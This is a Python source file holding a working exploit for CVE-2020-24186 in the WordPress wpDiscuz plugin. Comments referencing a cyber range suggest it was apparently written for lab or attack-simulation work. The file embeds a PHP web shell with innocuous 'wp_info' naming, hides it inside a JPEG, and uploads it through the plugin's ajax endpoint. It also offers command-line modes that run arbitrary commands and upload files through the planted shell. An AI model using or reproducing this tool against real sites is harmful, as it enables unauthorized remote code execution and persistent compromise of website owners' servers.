import base64
import json
import random
import re
import sys
from pathlib import Path
from typing import List, Optional, Pattern, TextIO, Tuple, Union

import requests
import urllib3
from bs4 import BeautifulSoup

DEFAULT_WEB_SHELL: str = """
<?php
function wp_info() {
    if(isset($_REQUEST['wp_data'])){
        $data_file = @fopen(base64_decode($_REQUEST['wp_info']), 'wb');
        fwrite($data_file, base64_decode($_REQUEST['wp_data']));
        fclose($data_file);
        return base64_encode(json_encode(["Added", base64_decode($_REQUEST['wp_info']), "info"]));
    }
    elseif(isset($_REQUEST['wp_info'])){
            exec(implode(" ",json_decode(base64_decode($_REQUEST['wp_info']))), $info);
          return base64_encode(json_encode($info));
    }else{
        return "no meta";
    }
  }
?>
<html>
<head><meta name="info" data="<?php echo wp_info() ?>" /></head>
<body>
Stats
</body>
</html>
"""


class UploadWebShell:
    """Transition function uploads a web shell to a wordpress instance.

    !!! Note
        This exploits CVE-2020-24186 for the upload see
        https://wpscan.com/vulnerability/10333

    """

    def __init__(
        self,
        url: str,
        jpeg: Path,
        image_name: Optional[str] = None,
        admin_ajax: str = "wp-admin/admin-ajax.php",
        exploit_code: str = DEFAULT_WEB_SHELL,
        verify: bool = False,
    ):
        """
        Args:
            url: The wordpress url
            jpeg: The path to the jpeg file to embed the code in
            image_name: The name to use when uploading the image (without the file extension).
                        Defaults to the name of the given jpeg file.
            admin_ajax: The relative path to the ajax endpoint (without leading /)
            exploit_code: The PHP web shell code to upload
            verify: If TLS certs should be verified or not
        """
        self.url: str = url
        self.admin_ajax: str = f"{url}/{admin_ajax}"
        self.jpeg: Path = jpeg
        self.image_name: str = image_name or jpeg.stem
        self.image_name += ".php"
        self.exploit_code: str = exploit_code
        self.verify: bool = verify
        self.nonce_regex: re.Pattern = re.compile(r'wmuSecurity"\s*:\s*"(\w*)"')
        with open(jpeg, "rb") as f:
            self.payload = f.read() + exploit_code.encode("utf-8")

    def __call__(self):
        session = requests.Session()
        session.verify = self.verify

        # get list of available posts
        print("Load posts page")
        response = session.get(self.url)
        print("Loaded posts page")
        soup = BeautifulSoup(response.text, "html.parser")
        articles = soup.find(id="main").find_all(name="article")

        if len(articles) > 0:
            # choose a random article under which to deploy the web shell
            article = random.choice(articles)
            post_url = article.find(name="h2", class_="entry-title").a.get("href")
            post_id = article.get("id").replace("post-", "")

            print(f"Load post info id={post_id} url={post_url}")
            response = session.get(post_url)
            print("Loaded post info")

            soup = BeautifulSoup(response.text, "html.parser")
            match = self.nonce_regex.search(
                soup.find("script", id="wpdiscuz-combo-js-js-extra").string,
            )

            if match is not None:
                nonce = match.group(1)

                # add nonce to log context
                data = {
                    "action": "wmuUploadFiles",
                    "wmu_nonce": nonce,
                    "wmuAttachmentsData": None,
                    "postId": post_id,
                }

                files = {
                    "wmu_files[0]": (
                        self.image_name,
                        self.payload,
                        "image/jpeg",
                    )
                }
                print("Uploading web shell")
                response = session.post(self.admin_ajax, data=data, files=files)
                json = response.json()

                # The returned URL might be of any of the following formats
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-150x150.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-225x300.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-768x1024.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-scaled.jpg
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333.php
                # but only the full sized image url will work as such we have parse the directory path
                # and image timestamp from the returned url and reconstruct the URL for the fullsized image
                url_regex: Pattern = re.compile(
                    # directory path
                    r"(http[s]:\/\/.*\/)("
                    # timestamped name has format <name>-<floating point epoch> e.g., special-1615472044.7333
                    + self.image_name.replace(".php", "")
                    + r"-\d*\.\d*).*\.(php|jpg)"
                )
                url_raw = (
                    json.get("data").get("previewsData").get("images")[0].get("url")
                )

                url_match = url_regex.match(url_raw)
                if url_match is not None:
                    # rebuild image url from directory path and timestamped name
                    web_shell = url_match.group(1) + url_match.group(2) + ".php"
                    print(f"Uploaded web shell web_shell={web_shell}")
                    return web_shell


def encode_cmd(cmd: List[str]) -> str:
    """Encodes the command and args list with JSON and base64.

    Args:
        cmd: The command and args list

    Returns:
        The base64 encoded command payload
    """
    return base64.b64encode(json.dumps(cmd).encode("utf-8")).decode("utf-8")


def decode_response(response: Union[str, bytes]) -> List[str]:
    """Extracts the web shell command output from the HTML response

    Args:
        response: The HTML response

    Returns:
        The command output as list of lines
    """
    # trim the response to the html area since
    # soup might have some issues with image bytes
    if isinstance(response, bytes):
        response = response[response.find(b"<html>") :]
    else:
        response = response[response.find("<html>") :]

    soup = BeautifulSoup(response, "html.parser")
    for tag in soup.findAll(name="meta", attrs={"name": "info"}):
        if tag.has_attr("data"):
            return json.loads(base64.b64decode(tag["data"]))
    return []


def send_request(
    url: str,
    cmd: List[str],
    cmd_param: str = "wp_info",
    verify: bool = False,
    timeout: Optional[float] = None,
    post: bool = False,
) -> List[str]:
    """Sends a b64 encoded web shell command via the given GET param.

    Args:
        log: The logging instance
        url: The URL to the web shell
        cmd: The command and its arguments as a list
        cmd_param: The GET parameter to embed the command in.
        verify: If HTTPS connection should very TLS certs
        timeout: The maximum time to wait for the web server to respond

    Returns:
        The commands output lines
    """
    # prepare get parameters and add them to log context
    params = {cmd_param: encode_cmd(cmd)}

    print(f"Sending web shell command params={params}")
    if post:
        r = requests.post(url, data=params, verify=verify, timeout=timeout)
    else:
        r = requests.get(url, params=params, verify=verify, timeout=timeout)
    print("Sent web shell command")

    return decode_response(r.text)


class UploadFileCommand:
    """Transition function that uploads a file using the web shell"""

    def __init__(
        self,
        file_name: str,
        file_src: str,
        web_shell: str,
        name_param: str = "wp_info",
        file_param: str = "wp_data",
        verify: bool = False,
        timeout: Optional[float] = None,
    ):
        """
        Args:
            cmd: The command and its arguments to execute
            cmd_param: The GET parameter to send the command in
            verify: If the TLS certs should be verified or not
            timeout: The maximum time to wait for the web server to respond
        """
        self.file_name: str = file_name
        self.file_src: str = file_src
        self.web_shell: str = web_shell
        self.name_param: str = name_param
        self.file_param: str = file_param
        self.verify: bool = verify
        self.timeout: Optional[float] = timeout

    def __call__(self):
        print(
            f"Uploading cmd={self.file_src} with name={self.file_name} on web_shell={self.web_shell}"
        )

        with open(self.file_src, "rb") as f:
            file_data = base64.b64encode(f.read()).decode("utf-8")

        # prepare get parameters and add them to log context
        params = {
            self.name_param: base64.b64encode(self.file_name.encode("utf-8")),
            self.file_param: file_data,
        }

        r = requests.post(
            self.web_shell, data=params, verify=self.verify, timeout=self.timeout
        )
        print("Sent web shell command")

        output = decode_response(r.text)
        print(f"Web shell command response output={output}")


class ExecWebShellCommand:
    """Transition function that executes a web shell command"""

    def __init__(
        self,
        cmd: List[str],
        web_shell: str,
        cmd_param: str = "wp_info",
        verify: bool = False,
        timeout: Optional[float] = None,
        post: bool = False,
    ):
        """
        Args:
            cmd: The command and its arguments to execute
            cmd_param: The GET parameter to send the command in
            verify: If the TLS certs should be verified or not
            timeout: The maximum time to wait for the web server to respond
        """
        self.cmd: List[str] = cmd
        self.web_shell: str = web_shell
        self.cmd_param: str = cmd_param
        self.verify: bool = verify
        self.timeout: Optional[float] = timeout
        self.post: bool = post

    def __call__(self):
        print(f"Executing cmd={self.cmd} on web_shell={self.web_shell}")
        output = send_request(
            self.web_shell,
            self.cmd,
            self.cmd_param,
            self.verify,
            self.timeout,
            self.post,
        )
        output = "\n".join(output)
        print(f"Web shell command response output={output}")


if __name__ == "__main__":
    urllib3.disable_warnings()

    if sys.argv[1] == "exploit":
        upload = UploadWebShell(sys.argv[2], Path(sys.argv[3]), image_name=sys.argv[4])
        # write webshell path to config file
        with open(sys.argv[5], "w") as f:
            f.write(upload())
    elif sys.argv[1] == "exec":
        with open(sys.argv[2], "r") as f:
            web_shell = f.read().strip()
        exec_cmd = ExecWebShellCommand(cmd=sys.argv[3:], web_shell=web_shell)
        exec_cmd()
    elif sys.argv[1] == "upload":
        with open(sys.argv[2], "r") as f:
            web_shell = f.read().strip()

        exec_cmd = UploadFileCommand(
            sys.argv[4],
            sys.argv[3],
            web_shell=web_shell,
        )
        exec_cmd()
    else:
        print("Unknown command type")
